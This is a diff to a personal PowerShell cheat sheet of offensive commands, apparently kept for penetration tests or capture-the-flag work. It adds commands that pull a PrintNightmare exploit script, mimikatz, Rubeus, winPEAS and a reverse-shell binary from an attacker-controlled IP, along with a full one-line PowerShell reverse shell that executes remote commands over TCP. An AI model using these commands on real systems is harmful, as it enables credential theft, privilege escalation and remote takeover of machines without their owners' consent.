@@ -24,8 +24,21 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080
 
 # powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.10.57:8080/rsh7.exe','rsh7.exe')"
+(New-Object System.Net.WebClient).Downloadfile('http://10.10.16.72:8000/CVE-2021-1675.ps1','runit.ps1')
 
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080/rsh7.exe');Start-Process "rsh7.exe"
+
+# Download file from HTTP
+Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
+
+# Download mimikatz files
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/mimidrv.sys" -OutFile ".\mimidrv.sys"
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/mimikatz.exe" -OutFile ".\mimikatz.exe"
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/mimilib.dll" -OutFile ".\mimilib.dll"
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/mimispool.dll" -OutFile ".\mimispool.dll"
+
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/rshell.exe" -OutFile ".\rshell.exe"
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/Rubeus.exe" -OutFile ".\Rubeus.exe"
+Invoke-WebRequest -Uri "http://10.10.16.72:8000/winPEASany.exe" -OutFile ".\winPEASany.exe"
 
 
 # Encode/Decode base64 in Powershell
@@ -42,3 +55,6 @@ Get-NetTCPConnection
 
 # get installed updates info
 Get-Hosfix
+
+# One-string reverse shell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
